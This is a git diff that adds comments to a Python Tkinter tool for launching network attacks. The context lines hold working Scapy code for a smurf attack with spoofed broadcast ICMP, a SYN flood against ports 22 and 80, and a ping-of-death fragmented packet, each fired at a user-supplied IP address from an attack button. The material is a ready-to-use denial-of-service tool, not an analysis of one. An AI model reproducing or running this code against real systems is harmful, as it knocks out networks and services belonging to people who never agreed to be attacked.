@@ -9,6 +9,7 @@ class BaseFrame(Frame):
     def __init__(self, master):
     	super().__init__(master)
 
+#this is the GUI code - creating the template. This is common across all, with the exception of labels/buttons in different areas.
     	self.header = Frame(self, width = 1024, height = 100)
     	self.main = Frame(self, width = 1024, height = 450)
     	self.footer = Frame(self, width = 1024, height = 50)
@@ -86,6 +87,7 @@ class BaseFrame(Frame):
     valid_hex = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f']
     valid_dec = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
 
+#this is a validtion function to check the IP entered is a valid IP address.
     def checkIP(self, ip):
         ip = ip.split(".")
         if len(ip) == 4:
@@ -105,18 +107,22 @@ class BaseFrame(Frame):
         else:
             return 0
 
+#function for a smurf attack
     def smurf(self, source_ip, r):
         source = source_ip.split(".")
         destination_ip = source[0] + "." + source[1] + "." + source[2] + ".255"
         send(IP(src=source_ip, dst=destination_ip)/ICMP(), count=10000)
 
+#function for a SYN flood
     def syn_flood(self, destination_ip, r):
         packet = IP(dst=destination_ip, id=random.randint(1000,9999), ttl=random.randint(10, 99))/TCP(sport=RandShort(), dport=[22,80], seq=12345, ack=1000, window=1000, flags="S", options=[("Timestamp", (10,0))])/"SYNFlood"
         ans,unans = srloop(packet, inter=0.3, retry=2, timeout=4)
 
+#function for a ping of death attack
     def ping_of_death(self, destination_ip, r):
         send(fragment(IP(dst=destination_ip)/ICMP()/('X'*60000)))
 
+#carries out attack when button pressed - message success or error
     def attack_btn_pressed(self):
         attack = self.attackchosen.get()
         userip = self.IPentry.get()
@@ -137,10 +143,12 @@ class BaseFrame(Frame):
         else:
             messagebox.showerror(title="ERROR!!!", message="The IP Address " + str(userip) + " is not Valid!")
 
+#back button function
     def back_btn_pressed(self):
         root.destroy()
         import MainMenu
 
+#redirects outputs to standard output
 class TextRedirector(object):
     def __init__(self, widget, tag="stdout"):
         self.widget = widget
@@ -151,7 +159,7 @@ class TextRedirector(object):
         self.widget.insert("end", str, (self.tag,))
         self.widget.configure(state="disabled")
 
-
+#This is the common theme across all menus
 root = Tk()
 root.option_add("*TCombobox*Listbox*Background", '#12263A')
 root.option_add("*TCombobox*Listbox*Foreground", '#63CCCA')
